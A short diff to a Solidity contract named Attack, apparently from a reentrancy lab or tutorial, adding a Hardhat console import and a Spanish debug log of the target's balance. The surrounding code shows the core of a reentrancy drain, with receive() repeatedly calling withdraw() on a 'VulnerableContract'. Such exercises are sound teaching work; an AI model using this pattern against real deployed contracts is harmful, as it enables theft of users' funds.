@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.28;
 
+import "hardhat/console.sol";
 import "./VulnerableContract.sol";
 
 contract Attack {
@@ -16,6 +17,7 @@ contract Attack {
     }
 
     receive() external payable {
+        console.log("Balance antes del ataque:", address(vulnerable).balance);
         if (address(vulnerable).balance >= msg.value) {
             vulnerable.withdraw();
         }
